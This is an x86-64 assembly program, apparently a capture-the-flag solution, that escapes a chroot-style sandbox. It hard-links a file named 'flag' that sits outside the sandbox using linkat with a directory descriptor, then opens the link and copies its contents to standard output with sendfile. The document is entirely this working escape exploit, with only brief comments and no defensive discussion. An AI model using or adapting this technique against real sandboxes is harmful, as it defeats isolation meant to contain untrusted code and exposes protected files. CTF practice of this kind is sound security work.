global _start

%define SYS_linkat 265
%define SYS_open 2
%define SYS_write 1
%define SYS_sendfile 40

_start:
    ; First open the sandbox root directory
    mov rax, SYS_open 
    lea rdi, [rel sandboxroot]
    xor rsi, rsi
    mov rdx, 1
    syscall

    mov rdx, rax ; sandbox root filedescriptor

    ; Now link using relative paths with file descriptors

    mov rax, SYS_linkat
    mov rdi, 3 
    lea rsi, [rel flag]
    lea r10, [rel link_flag]
    xor r8, r8
    syscall

    ; Open the linked flag (that are outsed the sandbox)
    mov rax, SYS_open
    lea rdi, [rel link_flag]
    xor rsi, rsi
    mov rdx, 1
    syscall

    ; Send data to stdout file descriptor
    mov rsi, rax
    mov rax, SYS_sendfile
    mov rdi, 1
    mov rdx, 0
    mov r10, 100
    syscall


link_flag:
    db "flagstealed", 0

flag:
    db "flag", 0

sandboxroot:
    db "/", 0   
